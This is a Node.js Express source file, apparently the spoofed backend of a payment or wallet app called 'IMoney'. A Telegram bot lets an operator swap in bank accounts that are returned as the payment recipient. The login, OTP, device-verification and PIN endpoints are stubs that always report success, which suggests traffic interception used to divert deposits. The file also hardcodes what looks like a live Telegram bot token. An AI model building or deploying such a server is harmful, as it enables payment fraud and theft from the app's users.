const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const kv = new Redis({
  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN
});

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const token = '8728397123:AAH7SGg0CBGLHds2QSMxps0F1FkCIvlmbvM';
const VERCEL_URL = process.env.VERCEL_URL || 'ixcv.vercel.app';
let bot;

if (token) {
  bot = new TelegramBot(token);
  bot.setWebHook(`https://${VERCEL_URL}/api/telegram`);
}

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  walletType: 'paytm',
  adminChatId: null,
  orders: {}
};

async function loadData() {
  try {
    const data = await kv.get('bankData');
    if (data) {
      if (!data.orders) data.orders = {};
      return data;
    }
  } catch (e) {
    console.error('KV load error:', e.message);
  }
  return { ...DEFAULT_DATA };
}

async function saveData(data) {
  try {
    await kv.set('bankData', data);
  } catch (e) {
    console.error('KV save error:', e.message);
  }
}

function getActiveBank(bankData) {
  if (bankData.activeIndex >= 0 && bankData.activeIndex < bankData.banks.length) {
    return bankData.banks[bankData.activeIndex];
  }
  return null;
}

function bankListText(bankData) {
  if (bankData.banks.length === 0) return 'No banks added yet.';
  return bankData.banks.map((b, i) => {
    const active = i === bankData.activeIndex ? ' ✅ ACTIVE' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${active}`;
  }).join('\n');
}

app.post('/api/telegram', async (req, res) => {
  try {
    if (!bot || !req.body) return res.sendStatus(200);

    const msg = req.body.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let bankData = await loadData();

    if (text === '/start') {
      if (bankData.adminChatId && bankData.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      bankData.adminChatId = chatId;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`🏦 IMoney Bank Controller Bot

Commands:
/addbank <AccountNo> | <HolderName> | <IFSC>
/removebank <number>
/usebank <number>
/setwallet <walletType>
/deactivate
/list
/status
/orders
/help

Example:
/addbank 1234567890 | Rahul Kumar | SBIN0001234
/usebank 1`
      );
    }

    else if (bankData.adminChatId && chatId !== bankData.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized. Only admin can use this bot.');
      return res.sendStatus(200);
    }

    else if (text === '/help') {
      await bot.sendMessage(chatId,
`Commands:

/addbank <AccountNo> | <HolderName> | <IFSC>
  Naya bank account add karo (max 10)

/removebank <number>
  Bank remove karo by number

/usebank <number>
  Active bank select karo

/setwallet <type>
  Wallet type: paytm, phonepe, freecharge, mobikwik, airtel, jio

/deactivate — Sab deactivate karo
/list — Saari banks dekho
/status — Active bank dekho
/orders — Recent orders dekho`
      );
    }

    else if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length !== 3) {
        await bot.sendMessage(chatId, '❌ Format: /addbank AccountNo | HolderName | IFSC');
        return res.sendStatus(200);
      }
      if (bankData.banks.length >= 10) {
        await bot.sendMessage(chatId, '❌ Maximum 10 banks. Pehle /removebank se koi hatao.');
        return res.sendStatus(200);
      }
      bankData.banks.push({ accountNo: parts[0], accountHolder: parts[1], ifsc: parts[2] });
      bankData.adminChatId = chatId;
      if (bankData.banks.length === 1) bankData.activeIndex = 0;
      await saveData(bankData);
      const idx = bankData.banks.length;
      await bot.sendMessage(chatId,
`✅ Bank #${idx} added:
Account: ${parts[0]}
Holder: ${parts[1]}
IFSC: ${parts[2]}
${bankData.banks.length === 1 ? '(Auto-activated)' : `Use /usebank ${idx} to activate`}`
      );
    }

    else if (text.startsWith('/removebank ')) {
      const num = parseInt(text.substring(12).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, `❌ Invalid. Use 1-${bankData.banks.length}. Check /list`);
        return res.sendStatus(200);
      }
      const idx = num - 1;
      const removed = bankData.banks.splice(idx, 1)[0];
      if (bankData.activeIndex === idx) {
        bankData.activeIndex = bankData.banks.length > 0 ? 0 : -1;
      } else if (bankData.activeIndex > idx) {
        bankData.activeIndex--;
      }
      bankData.adminChatId = chatId;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}
${bankData.banks.length > 0 ? `Active: #${bankData.activeIndex + 1}` : 'No banks left.'}`
      );
    }

    else if (text.startsWith('/usebank ')) {
      const num = parseInt(text.substring(9).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, `❌ Invalid. Use 1-${bankData.banks.length}. Check /list`);
        return res.sendStatus(200);
      }
      bankData.activeIndex = num - 1;
      bankData.adminChatId = chatId;
      await saveData(bankData);
      const bank = bankData.banks[bankData.activeIndex];
      await bot.sendMessage(chatId,
`✅ Bank #${num} ACTIVATED:
Account: ${bank.accountNo}
Holder: ${bank.accountHolder}
IFSC: ${bank.ifsc}
Wallet: ${bankData.walletType}`
      );
    }

    else if (text.startsWith('/setwallet ')) {
      const type = text.substring(11).trim().toLowerCase();
      const valid = ['paytm', 'phonepe', 'freecharge', 'mobikwik', 'airtel', 'jio'];
      if (!valid.includes(type)) {
        await bot.sendMessage(chatId, `❌ Invalid. Options: ${valid.join(', ')}`);
        return res.sendStatus(200);
      }
      bankData.walletType = type;
      bankData.adminChatId = chatId;
      await saveData(bankData);
      await bot.sendMessage(chatId, `✅ Wallet type: ${type}`);
    }

    else if (text === '/deactivate') {
      bankData.activeIndex = -1;
      bankData.adminChatId = chatId;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 All banks DEACTIVATED.');
    }

    else if (text === '/list') {
      await bot.sendMessage(chatId, `🏦 Saved Banks:\n\n${bankListText(bankData)}\n\nWallet: ${bankData.walletType}`);
    }

    else if (text === '/status') {
      const active = getActiveBank(bankData);
      if (!active) {
        await bot.sendMessage(chatId, '🔴 No active bank. Use /usebank <number>');
        return res.sendStatus(200);
      }
      await bot.sendMessage(chatId,
`🟢 Active Bank:
Account: ${active.accountNo}
Holder: ${active.accountHolder}
IFSC: ${active.ifsc}
Wallet: ${bankData.walletType}
Total Banks: ${bankData.banks.length}`
      );
    }

    else if (text === '/orders') {
      const orderKeys = Object.keys(bankData.orders);
      if (orderKeys.length === 0) {
        await bot.sendMessage(chatId, 'No orders yet.');
        return res.sendStatus(200);
      }
      const recent = orderKeys.slice(-10).reverse();
      let t = '📋 Recent Orders:\n\n';
      for (const key of recent) {
        const o = bankData.orders[key];
        const utr = o.utr ? `✅ UTR: ${o.utr}` : '⏳ UTR pending';
        t += `${o.orderId} | ₹${o.amount} | ${utr}\n`;
      }
      await bot.sendMessage(chatId, t);
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error('Telegram handler error:', err);
    return res.sendStatus(200);
  }
});

app.get('/wallet/online/walletType', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData);
  if (!active) {
    return res.json({ code: 0, data: null, msg: 'No active wallet' });
  }
  res.json({
    code: 1,
    data: {
      receiveAccountNo: active.accountNo,
      receiveAccountName: active.accountHolder,
      receiveIfsc: active.ifsc,
      walletType: bankData.walletType
    },
    msg: 'success'
  });
});

app.post('/money/orderId', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData);
  if (!active) return res.json({ code: 0, data: null, msg: 'Service unavailable' });

  const orderId = 'RS' + Date.now() + Math.random().toString(36).substring(2, 6);
  const amount = req.body.amount || '0';

  bankData.orders[orderId] = {
    orderId, amount, account: active.accountNo, holder: active.accountHolder,
    ifsc: active.ifsc, walletType: bankData.walletType, status: 'pending',
    utr: null, createdAt: new Date().toISOString()
  };
  await saveData(bankData);

  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`🔔 New Order!
Order ID: ${orderId}
Amount: ₹${amount}
Wallet: ${bankData.walletType}
Account: ${active.accountNo}
Holder: ${active.accountHolder}
IFSC: ${active.ifsc}`
    ).catch(() => {});
  }

  res.json({
    code: 1,
    data: {
      orderId, amount,
      receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder,
      receiveIfsc: active.ifsc, walletType: bankData.walletType, status: 'pending'
    },
    msg: 'success'
  });
});

app.post('/money/uploadUtr', async (req, res) => {
  const { orderId, utr, utrAmount } = req.body;
  const bankData = await loadData();

  if (orderId && bankData.orders[orderId]) {
    bankData.orders[orderId].utr = utr;
    bankData.orders[orderId].status = 'utr_uploaded';
    await saveData(bankData);
  }

  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`💰 UTR Uploaded!
Order ID: ${orderId || 'N/A'}
UTR Number: ${utr || 'N/A'}
Amount: ₹${utrAmount || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }

  res.json({ code: 1, data: { orderId, utr, status: 'submitted' }, msg: 'UTR uploaded successfully' });
});

app.post('/money/cancelUtr', async (req, res) => {
  const { orderId } = req.body;
  const bankData = await loadData();

  if (orderId && bankData.orders[orderId]) {
    bankData.orders[orderId].status = 'utr_cancelled';
    bankData.orders[orderId].utr = null;
    await saveData(bankData);
  }

  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`❌ UTR Cancelled!
Order ID: ${orderId || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }

  res.json({ code: 1, data: null, msg: 'UTR cancelled' });
});

app.post('/money/init/order', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData);
  if (!active) return res.json({ code: 0, data: null, msg: 'Service unavailable' });

  const orderId = 'RS' + Date.now() + Math.random().toString(36).substring(2, 6);
  const amount = req.body.amount || '0';

  bankData.orders[orderId] = {
    orderId, amount, account: active.accountNo, holder: active.accountHolder,
    ifsc: active.ifsc, walletType: bankData.walletType, status: 'pending',
    utr: null, createdAt: new Date().toISOString()
  };
  await saveData(bankData);

  res.json({
    code: 1,
    data: {
      orderId, amount,
      receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder,
      receiveIfsc: active.ifsc, walletType: bankData.walletType, status: 'pending'
    },
    msg: 'success'
  });
});

app.post('/money/create/v2', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData);
  if (!active) return res.json({ code: 0, data: null, msg: 'Service unavailable' });

  const orderId = 'RS' + Date.now() + Math.random().toString(36).substring(2, 6);
  const amount = req.body.amount || '0';

  bankData.orders[orderId] = {
    orderId, amount, account: active.accountNo, holder: active.accountHolder,
    ifsc: active.ifsc, walletType: bankData.walletType, status: 'pending',
    utr: null, createdAt: new Date().toISOString()
  };
  await saveData(bankData);

  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`🔔 New Order (v2)!
Order ID: ${orderId}
Amount: ₹${amount}
Account: ${active.accountNo}
Holder: ${active.accountHolder}`
    ).catch(() => {});
  }

  res.json({
    code: 1,
    data: {
      orderId, amount,
      receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder,
      receiveIfsc: active.ifsc, walletType: bankData.walletType, status: 'pending'
    },
    msg: 'success'
  });
});

app.get('/money/order/list', (req, res) => {
  res.json({ code: 1, data: [], msg: 'success' });
});

app.get('/money/list/v2', (req, res) => {
  res.json({ code: 1, data: { list: [], total: 0 }, msg: 'success' });
});

app.post('/money/check/payStatus', async (req, res) => {
  const { orderId } = req.body;
  const bankData = await loadData();
  const order = orderId ? bankData.orders[orderId] : null;
  res.json({
    code: 1,
    data: { orderId: orderId || '', status: order ? order.status : 'pending', payStatus: 0 },
    msg: 'success'
  });
});

app.post('/money/returnOrder', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/money/returnOrder/check', (req, res) => res.json({ code: 1, data: { status: 0 }, msg: 'success' }));
app.get('/banner', (req, res) => res.json({ code: 1, data: [], msg: 'success' }));
app.get('/contact/info', (req, res) => res.json({ code: 1, data: { telegram: '', whatsapp: '', email: '' }, msg: 'success' }));
app.get('/user/index', (req, res) => res.json({ code: 1, data: { balance: '0', totalRecharge: '0' }, msg: 'success' }));
app.post('/user/check/paypwd', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.get('/user/checkPinStatus', (req, res) => res.json({ code: 1, data: { hasPinSet: true }, msg: 'success' }));
app.get('/user/cashFlow', (req, res) => res.json({ code: 1, data: [], msg: 'success' }));
app.get('/bank/list', (req, res) => res.json({ code: 1, data: [], msg: 'success' }));
app.post('/bank/create', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/bank/update', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/bank/delete', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.get('/wallet/list', (req, res) => res.json({ code: 1, data: [], msg: 'success' }));
app.post('/wallet/add', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/wallet/add/v2', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/wallet/connect', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/wallet/stop', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/wallet/deviceBuild', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/wallet/deviceCheck', (req, res) => res.json({ code: 1, data: { status: 1 }, msg: 'success' }));
app.post('/wallet/sendDeviceOtp', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/wallet/deviceOtpVerify', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/wallet/sendOtp', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/wallet/directLogin', (req, res) => res.json({ code: 1, data: { token: 'session_' + Date.now() }, msg: 'success' }));
app.post('/wallet/directLogin/v2', (req, res) => res.json({ code: 1, data: { token: 'session_' + Date.now() }, msg: 'success' }));
app.post('/wallet/upload/video', (req, res) => res.json({ code: 1, data: null, msg: 'Upload successful' }));
app.post('/login', (req, res) => res.json({ code: 1, data: { token: 'session_' + Date.now() }, msg: 'success' }));
app.post('/smsCode', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/user/setLoginPwd', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/user/setPayPwd', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/user/forgetPass', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));
app.post('/user/setTelegram', (req, res) => res.json({ code: 1, data: null, msg: 'success' }));

app.get('/health', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData);
  res.json({
    status: 'ok', bankActive: !!active, totalBanks: bankData.banks.length,
    walletType: bankData.walletType, totalOrders: Object.keys(bankData.orders).length
  });
});

app.use((req, res) => {
  console.log(`[CATCH-ALL] ${req.method} ${req.url}`);
  res.json({ code: 1, data: null, msg: 'success' });
});

module.exports = app;
